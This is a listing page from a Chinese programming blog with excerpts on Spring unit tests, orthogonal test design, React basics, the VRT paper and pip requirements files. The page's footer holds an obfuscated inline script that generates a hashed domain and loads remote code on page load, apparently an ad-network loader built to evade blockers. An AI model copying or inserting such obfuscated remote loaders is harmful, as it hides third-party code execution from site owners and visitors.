package com.test.danyuanceshi.controller; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; /** * 单元测试联系示例使用到的controller */ @RestController public class DanYuanCeShiController { @GetMapping("/get/not/param") public String testDanYanControllerNotParam(){ return "没有请求参数的单元测试get方法"; } } package com.test.danyuanceshi.controller; import org.junit.Assert; import org.junit.Before; import org.junit.BeforeClass; import org.junit.Test; import org.junit.runner.RunWith; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.http.MediaType; import org.springframework.test.context.junit4.SpringRunner; import org.springframework.test.web.servlet.MockMvc; import org.springframework.test.web.servlet.MvcResult; import org.springframework.test.web.servlet.request.MockMvcRequestBuilders; import org.springframework.test.web.servlet.result.MockMvcResultHandlers; import org.springframework.test.web.servlet.setup.MockMvcBuilders; import org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a30a5f6262c7eba5f9819ef162cd485a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63e9063f9aec5e92c212f7f6085ae64c/" rel="bookmark">
			软件测试---正交试验法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 正交试验法（简单的做个比较，深入不懂。。。。。） 使用到的工具：正交表
内涵：从大量的实验数据中找到合适的实验数据组合
涉及数学原理：《概率论》《线性代数》《数理统计》
基本思想：
因素：影响试验结果的原因、条件水平（因素水平）：每一个因素的取值每一列中，同一数字（水平），出现的次数相等任意两列组成的数字对（水平对）出现的次数相等例如： 如何使用（实施步骤） 1）确定因素：分析所有对结果有影响的因素。从多个角度和方式进行分析（不要放过文本框、
按钮等需求中提及的或者没有提及的）2）确定每个因素水平（取值）：分析每个因素的水平数量。充分利用等价类、边界值〈需求中说明和未说明的都要分析）3）选择正交表。只有特定的因素数和水平数的组合才有对应的正交表。所以在现实中用到的时候，找最贴近的正交表（正交表的因素数和水平数一般要大于实际的因素数和水平数。） 正交表 注：式子Ln（m k）没有数字关系，不是指数和函数关系n 仅代表实验次数m 仅代表水平数k 仅代表因素数这三个数字没有任何的数字关系仅适用于每一个因素的水平数都相同的正交表 案例 1、每个因素的水平数相同案例： 组合数：333 = 27，所以正常要进行27次试验正交方式： 使用工具：正交设计助手，下载链接如下（蓝奏云），解压缩直接用：https://wwr.lanzoux.com/iDIy8oc468j
密码:a9du此案例选择latin.exe报错，确定即可，不影响新建工程新建实验填写说明（先别点确定）选择正交表（说明：此处应该选最接近的，水平数（m）不可以少，因素数（k）可以多，本来应该选L9_3_3，因为没有此选项，所以选最接近的L9_3_4）因为水平数不可以少，因素数可以多，所以不能选L9_2_3先不要点确定因素和水平设置得到正交表每一行就是一个测试用例注意看： 1、每一列的因素出现的次数相等2、任意两列组成的水平对出现的次数相等（1,60）（1,15）、（60,15） 所以，仅需要9次试验，将有代表性的数据进行试验 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2104c0d2eb1857d9c17af0c8aed082f6/" rel="bookmark">
			react快速入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		React 是什么？ React 是一个声明式，高效且灵活的用于构建用户界面的 JavaScript 库。使用 React 可以将一些简短、独立的代码片段组合成复杂的 UI 界面，这些代码片段被称作“组件”
JSX 语法
const element = &lt;h1&gt;Hello, world!&lt;/h1&gt;; 这个有趣的标签语法既不是字符串也不是 HTML。
它被称为 JSX，是一个 JavaScript 的语法扩展。我们建议在 React 中配合使用 JSX，JSX 可以很好地描述 UI 应该呈现出它应有交互的本质形式。JSX 可能会使人联想到模版语言，但它具有 JavaScript 的全部功能。
在 JSX 中嵌入表达式 在下面的例子中，我们声明了一个名为 name 的变量，然后在 JSX 中使用它，并将它包裹在大括号中：
const name = 'Josh Perez'; const element = &lt;h1&gt;Hello, {name}&lt;/h1&gt;; ReactDOM.render( element, document.getElementById('root') ); 在 JSX 语法中，你可以在大括号内放置任何有效的 JavaScript 表达式。例如，2 + 2，user.firstName 或 formatName(user) 都是有效的 JavaScript 表达式。
在下面的示例中，我们将调用 JavaScript 函数 formatName(user) 的结果，并将结果嵌入到 &lt;h1&gt; 元素中。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2104c0d2eb1857d9c17af0c8aed082f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3775680a9c16853969e675d2d36bdcef/" rel="bookmark">
			[2201] VRT: A Video Restoration Transformer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		paper
supp
code
Content AbstractMethodmodel architecturetemporal mutual self attention (TMSA)mutual attentiontemporal mutual self attention parallel warping (PW) Experimentvideo super resolutionvideo deblurringvideo denoisingablation studymulti-scale architecture &amp; parallel warpingtemporal mutual self attentionattention window size Abstract video restoration methods
sliding window-based method
input multiple LQ frames to generate a single HQ frame
each input frame processed for multiple times in inference
⟹ \implies ⟹ inefficient feature utilization and increased computation costrecurrent method
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3775680a9c16853969e675d2d36bdcef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca400f1ebda1c4369faf9f78431fa7cd/" rel="bookmark">
			python 模块信息导出及安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 背景 在windows开发一个项目，pip3 安装了很多的模块，最终该项目才可以运行，比如crm代码
代码上传到一个新的服务器，是一个空的环境，还得在部署一遍，比如crm代码
土办法：运行代码，查看报错，一个一个模块单独去安装解决不那么土的办法：#把你当前解释器所有用到的模块，信息导出到一个文件中
pip3 freeze &gt; requirements.txt 1. 在windows的cmd命令行中，通过此命令导出模块信息 pip3 freeze &gt; requirements.txt 2. 把此文件发送给linux机器，或者直接拷贝其内容，也可以 在linux机器上，安装此文件即可，自动读取文件每一行的模块信息，自动安装 pip3 install -i https://pypi.douban.com/simple -r requirements.txt 本质用法：这个命令其实就是，将一个解释器的模块信息导出，丢给其他人去安装 学习阶段，模拟使用 1.在物理解释器下，安装各种模块 2.在虚拟环境下，安装此模块文件 `` 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/154/">«</a>
	<span class="pagination__item pagination__item--current">155/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/156/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>